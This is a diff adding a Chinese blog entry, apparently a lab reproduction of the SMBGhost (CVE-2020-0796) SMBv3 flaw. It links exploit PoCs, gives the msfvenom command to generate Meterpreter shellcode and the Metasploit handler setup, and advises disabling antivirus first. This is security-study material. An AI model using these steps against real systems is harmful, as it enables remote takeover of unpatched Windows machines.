@@ -4,6 +4,25 @@
   
     
     <entry>
+      <title>SMBGhost命令执行漏洞</title>
+      <link href="/2020/12/31/SMBGhost%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/"/>
+      <url>/2020/12/31/SMBGhost%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/</url>
+      
+        <content type="html"><![CDATA[<h3 id="漏洞简介："><a href="#漏洞简介：" class="headerlink" title="漏洞简介："></a><strong>漏洞简介：</strong></h3><p>该漏洞是由于SMBv3在处理 恶意伪造的压缩数据包 时出现的错误引发的，从而造成SMB服务器的缓冲区溢出。成功利用该漏洞的攻击者可以在目标SMB服务器或客户端上执行代码。</p><h3 id="受影响系统及应用版本"><a href="#受影响系统及应用版本" class="headerlink" title="受影响系统及应用版本"></a><strong>受影响系统及应用版本</strong></h3><p>Windows 10版本1903（用于32位系统）</p><p>Windows 10版本1903（用于基于ARM64的系统）</p><p>Windows 10版本1903（用于基于x64的系统）</p><p>Windows 10版本1909（用于32位系统）</p><p>Windows 10版本1909（用于基于ARM64的系统）</p><p>Windows 10版本1909（用于）基于x64的系统</p><p>Windows Server 1903版（服务器核心安装）</p><p>Windows Server 1909版（服务器核心安装）</p><h3 id="利用工具"><a href="#利用工具" class="headerlink" title="利用工具"></a>利用工具</h3><p>CVE-<strong>2020-0796</strong> 相关检测工具及攻击代码：</p><p>git检测脚本：<a href="https://github.com/ollypwn/SMBGhost">https://github.com/ollypwn/SMBGhost</a></p><p>奇安信检测工具：<a href="http://dl.qianxin.com/skylar6/CVE-2020-0796-Scanner.zip">http://dl.qianxin.com/skylar6/CVE-<strong>2020-0796</strong>-Scanner.zip</a></p><p>蓝屏POC：<a href="https://github.com/eerykitty/CVE-2020-0796-PoC">https://github.com/eerykitty/CVE-<strong>2020-0796</strong>-PoC</a></p><p>本地提权POC：<a href="https://github.com/danigargu/CVE-2020-0796">https://github.com/danigargu/CVE-<strong>2020-0796</strong></a></p><p>远程利用代码：<a href="https://github.com/chompie1337/SMBGhost_RCE_PoC">https://github.com/chompie1337/SMBGhost_RCE_PoC</a></p><h3 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h3><p><strong>本地提权：</strong>下载本地提权POC用PowerShell运行脚本</p><p><img src="/2020/12/31/SMBGhost%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/0.gif"></p><p><strong>远程代码执行：</strong></p><p>生成MSF反向连接的木马</p><pre><code>msfvenom -p windows/x64/meterpreter/bind_tcp LPORT=4444 -b &#39;\x00&#39; -i 1 -f python</code></pre><p>将生成的POC在Exploit中换掉</p><p><img src="/2020/12/31/SMBGhost%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/2.png"></p><p><img src="/2020/12/31/SMBGhost%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/1.png"></p><p><strong>MSF进行监听</strong></p><pre><code>use exploit/multi/handlerset payload windows/x64/meterpreter/bind_tcpset lport 4444set rhost 192.168.33.131run</code></pre><p><strong>成功回弹：</strong></p><p><img src="/2020/12/31/SMBGhost%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/4.png"></p><p><strong>总结：</strong></p><p>火绒会阻止对外攻击，先关掉</p><p>有些人说更python版本有关，我3.7没问题，但有人3.6才行；内存听别人说必须4G才行，我亲测2G也可以。</p>]]></content>
+      
+      
+      
+        <tags>
+            
+            <tag> 漏洞复现 </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
       <title>CVE2020-1472漏洞复现</title>
       <link href="/2020/11/19/CVE2020-1472%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
       <url>/2020/11/19/CVE2020-1472%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/</url>
